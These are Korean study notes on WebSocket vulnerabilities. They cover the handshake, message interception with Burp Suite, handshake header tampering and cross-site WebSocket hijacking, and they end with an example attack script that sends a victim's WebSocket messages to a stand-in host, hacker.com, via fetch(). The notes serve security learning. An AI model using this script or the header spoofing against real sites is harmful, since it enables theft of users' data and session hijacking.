## 웹소켓 취약점

일반적인 HTTP에서 발생할 수 있는 거의 모든 취약점이 웹소켓 통신에서도 발생할 수 있음. 

### 웹소켓

클라이언트와 서버 간에 **실시간 양방향 통신**을 가능하게 하는 HTML5 표준 통신 프로토콜
처음 연결은 HTTP 핸드셰이크를 통해 이루어지고 연결을 끊을 때까지 유지됨. 웹소켓 연결이 설정되면 클라이언트와 서버는 비동기 방식으로 메시지를 주고 받을 수 있음. 보통 JSON 형식 사용
예: 실시간 채팅 및 메신저, 주식 및 실시간 금융 거래 정보, 실시간 알림 및 대시보드 업데이트 

웹소켓은 일반적으로 클라이언트 측 JavaScript를 사용하여 연결함.
``` js
var ws = new WebSocket("wss://normal-website.com/chat");
```

그러면 브라우저와 서버는 HTTP를 통해 웹소켓 핸드셰이크를 수행
``` http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

``` http
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

브라우저에서 클라이언트 측 JavaScript를 사용하여 메시지 전송 
``` js
ws.send("Peter Wiener");
```


### 웹소켓 트래픽 조작

#### 메시지 가로채기

Burp Proxy를 사용하여 웹소켓 메시지를 가로채고 수정할 수 있음. 

- Burp Proxy의 WebSockets history 탭에서 웹소켓 기록 확인 가능
- Burp Proxy의 Intercept 탭에서, 인터셉트 기능 활성화
- 브라우저 또는 서버에서 WebSocket 메시지가 전송되면, 해당 메시지는 Intercept 탭에서 확인하거나 수정할 수 있. 메시지를 전달하려면 Forward 버튼을 클릭하면 됨. 

#### 메시지 생성 및 재전송

WebSockets history 탭이나 Intercept 탭에서 ㄴSend to Repeater를 하면 Repeater에서 웹소켓 메시지를 보낼 수 있음. 

#### 연결 조작

Burp Repeater의 연필 아이콘을 클릭하면 기존에 연결된 웹소켓에 연결하거나 새로운 웹소켓을 연결할 수 있음. 


### 취약점

- 사용자로부터 입력받은 데이터가 안전하지 않은 방식으로 처리되는 경우, SQL 인젝션이나 XML 삽입 같은 취약점이 발생할 수 있음. 
- 공격자가 제어하는 데이터가 웹소캣을 통해 다른 사용자에게 전송될 경우 XSS가 발생할 수 있음. 

#### 핸드셰이크 조작

웹소켓 핸드셰이크의 HTTP 헤더 값을 조작하여 인증 우회, IP 제한 우회, 권한 상승 등을 할 수 있음. 

``` http
GET /chat HTTP/1.1
Host: normal-website.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
X-Forwarded-For: 1.1.1.1          ← 추가
Origin: https://attacker.com      ← 변조
Cookie: session=...               ← 다른 세션 쿠키로 교체
```


#### CSWSH

CSWSH(교차 사이트 웹소켓 하이재킹)는 웹소켓 핸드셰이크에서 발생하는 CSRF(크로스 사이트 요청 위조) 취약점을 말함. 
공격자가 만든 사이트에 피해자가 방문하면 그 사이트에서 JavaScript로 **피해자의 브라우저를 이용해 타겟 사이트로 웹소켓 연결을 맺게 하고** 민감한 데이터를 유출하거나 피해자로 위장하고 행동할 수 있음. 
- 피해자가 타겟 사이트에 로그인 되어 있는 경우 세션 쿠키를 웹소켓 연결 요청에 자동으로 포함시킴.
- CSRF 토큰처럼 예측 불가능한 값을 사용하지 않는 핸드셰이프이어야 함. 

브라우저는 **웹소켓 연결을 시작할 때 다른 사이트로의 연결(Cross-Origin) 요청 자체를 제한하지 않는다**는 특징을 이용한 것임. 


**공격 스크립트** 

``` html
<script>
var ws = new WebSocket("wss://target.com/chat");
ws.onopen = function() {
    ws.send("READY"); // 이 메시지를 받으면 서버에서 채팅 기록을 보내주는 구조
};
ws.onmessage = function(event) {
    fetch("https://hacker.com?data=" + encodeURIComponent(event.data));
};
</script>
```
